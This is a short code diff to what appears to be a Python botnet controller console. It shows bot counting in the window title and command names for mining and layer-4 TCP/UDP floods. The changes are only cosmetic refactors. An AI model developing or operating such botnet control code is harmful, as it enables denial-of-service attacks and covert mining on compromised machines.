@@ -87,7 +87,7 @@ def listen():
 
 
 def title():
-    while 1:
+    while True:
         if sys.platform != "linux":
             os.system(f"title bots: {len(clients)}")
             time.sleep(5)
@@ -134,7 +134,7 @@ def server():
         elif console == "methods":
             print(methods)
 
-        elif console in ["miner", "stat", "l4 tcp", "l4 udp", "l4 tcp stop", "l4 udp stop", "disconnect"]:
+        elif console in ["stat", "miner", "l4 tcp", "l4 udp", "l4 tcp stop", "l4 udp stop", "disconnect"]:
             print("\033[31m[-]\033[0m You are not connected\n")
 
         # Remote
